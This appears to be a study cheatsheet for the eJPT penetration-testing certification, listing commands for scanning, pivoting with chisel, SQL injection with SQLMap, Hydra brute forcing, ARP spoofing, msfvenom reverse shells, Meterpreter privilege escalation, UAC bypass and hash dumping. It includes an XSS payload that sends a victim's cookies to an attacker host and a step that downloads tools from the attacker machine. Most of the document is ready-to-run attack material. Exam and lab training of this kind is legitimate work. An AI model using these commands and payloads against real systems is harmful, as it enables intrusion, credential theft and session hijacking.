# eJPT-Cheatsheet

## fPing
```sh
fping -a -g x.x.x.x/24 2>/dev/null > targets
```
## Nmap
```sh
nmap -sn x.x.x.x/24
nmap -sV -p- -iL targets -oN nmap.initial -v
nmap -A -p- -iL targets -oN nmap.aggressive -v
nmap -p<port> --script=vuln -v <target-IP>
```

**Custom nmap scan (Not from the course)**
```sh
nmap -p- -sS --open -T4 -n -Pn -iL targets -oN alltargetports
nmap -sCV -p<ports> -Pn -vvv <ip-to-scan> -oN portversion
```
## Subdomains
```sh
sublist3r -d <target-nameaddress>
```
## IP Route
```sh
ip route add <Network-range> via <router-IP> dev <interface>
```
## Pivoting without Metasploit
**For this I will use chisel tool**\
**Pass chisel to the machine to pivot**\
**1. Attacker** 
```sh
python -m SimpleHTTPServer xxxx
nc -lvp xxxx
```
**2. Machine to pivot** 
```sh
wget <attacker-ip>:<port>/chisel
```
**Pivoting configuration**\
**3. Attacker machine**
```sh
./chisel server --reverse -p xxxx
```
**4. Machine to pivot**
```sh
./chisel client <attacker-ip> 127.0.0.1:<port>:<target-ip>:<port>
```
## John 
**Dictionary crack**
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
**Crack other encrypted files**
```sh
locate *2john # First find the tools to export from the encrypted file a hash
# RAR Ex: 
rar2john ./encrypted.rar > ./encrypted.rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ./encrypted.rar.hash # Finally, crack it with John
```

## Dirb
```sh
dirb http://<target-ip>/
dirb http://<target-ip>/dir -u admin:admin
```
*Faster using dirbuster. Threads at 20 and use /usr/share/wordlists/dirb/common.txt wordlist. Larger wordlists are not worth it for the exam*

## Netcat
**Listening for reverse shell**
```sh
nc -lvp 1234
```
**Banner Grabbing**
```sh
nc -nv <target-ip> <port> # No https
openssl s_client -connect 10.10.10.10:443 # Https, or in Netcat use --ssl flag.
```
## SQLMap
#### 1. Check if injection exists
```sh
sqlmap -r Post.req
sqlmap -u "http://<target-ip>/file.php?id=1" -p id
sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin"
```
#### 2. Get database if injection Exists
```sh
sqlmap -r login.req --dbs
sqlmap -u "http://<target-ip>/file.php?id=1" -p id --dbs
sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin" --dbs
```
#### 3. Get Tables in a Database
```sh
sqlmap -r login.req -D dbname --tables
sqlmap -u "http://<target-ip>/file.php?id=1" -p id -D dbname --tables
sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin" -D dbname --tables
```
#### 4. Get data in a Database tables
```sh
sqlmap -r login.req -D dbname -T table_name --dump
sqlmap -u "http://<target-ip>/file.php?id=1" -p id -D dbname -T table_name --dump
sqlmap -u "http://<target-ip>/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
```
## Hydra
**SSH Login Bruteforcing**
```sh
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u <target-ip> ssh
hydra -v -V -u -l root -P passwords.txt -t 1 -u <target-ip> ssh
```
*Replace ssh for other services when needed*

**HTTP POST Form**
```sh
hydra http://<target-ip>/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
```

## XSS
**Methodology**
1. Find a field with user input data and that is reflected to the page.
2. Test with html tags (\<i\>, \<h1\>) and see how it is processed.
3. Test with Javascript code as alert(), and see how it is processed.
Ex:
```sh
<script>alert(1)<script>
<ScRiPt>alert(1)<ScRiPt>
```
**Cookie Hijjacking**
```sh
#Vulnerable site:
<script>var i = new Image();i.src="http://<attacker-ip>/log.php?q="+document.cookie;</script>

#Attacker Machine:
nc -vv -k -l -p 80 #Obtain the cookie and use Cookie Quick Manager to use it in the website
```
*XSS filter bypass cheatsheet*\
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## msfvenom shells
**JSP Java Meterpreter Reverse TCP**
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Host-IP> LPORT=<Port> -f raw > shell.jsp
```
**WAR**
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Host-IP> LPORT=<Port> -f war > shell.war
```
**PHP**
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Host-IP> LPORT=<Port> -f raw > shell.php\
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
**PHP non meterpreter**
```sh
msfvenom -p php/reverse_php LHOST=<Host-IP> LPORT=<Port> -f raw > shell.php
```
## Upload a Shell with HTTP VERB PUT
```sh
wc -m shell.php # First we need to know the size of the file

PUT /shell.php # With BurpSuite create this request and send it
Content-type: text/html
Content-length: x
```
## Metasploit Meterpreter autoroute
```sh
run autoroute -s x.x.x.x/24
```
## ARPSpoof
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <interface> -t <target-ip> -r <host-ip>
```
## SMB Enumeration
**Get shares, users, groups, password policy**
```sh
smbclient -L //<target-ip>/
enum4linux -U -M -S -P -G <target-ip>
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains <target-ip> -p 135,139,445 -v
nmap -p445 --script=smb-vuln-* <target-ip> -v
```
**Access Share**
```sh
smbclient //<target-ip>/share_name
```
## FTP Enumeration
```sh
nmap --script=ftp-anon <target-ip> -p21 -v
nmap -A -p21 <target-ip> -v
```
**Login to FTP server**
```sh
ftp <target-ip>
```
**Login to FTP server no common port**
```sh
ftp <target-ip> <port>
```
## Meterpreter
```sh
ps
getuid
getpid
getsystem
ps -U SYSTEM
```
**CHECK UAC/Privileges**
```sh
run post/windows/gather/win_privs
```
**BYPASS UAC**
```sh
*Background the session first*
exploit/windows/local/bypassuac
set session
```
**After PrivEsc**
```sh
migrate <pid>
hashdump
```
## Windows Command Line
**Search for a file starting from current directory**
```sh
# Find files through their filename
dir /b/s/p "*.conf"
dir /b/s/p "*.txt"
dir /b/s/p "*filename"

#Find files through their content
findstr /s/m/i administrator c:\users
```
**Routing table**
```sh
route print
netstat -r
```
**Check Users**
```sh
net users
```
**List drives on the machine**
```sh
wmic logicaldisk get Caption,Description,providername
```
## Privilige Escalation Linux
```sh
cat /etc/shadow # Users hashing passwords
sudo -l # Search for enviroment variables
```
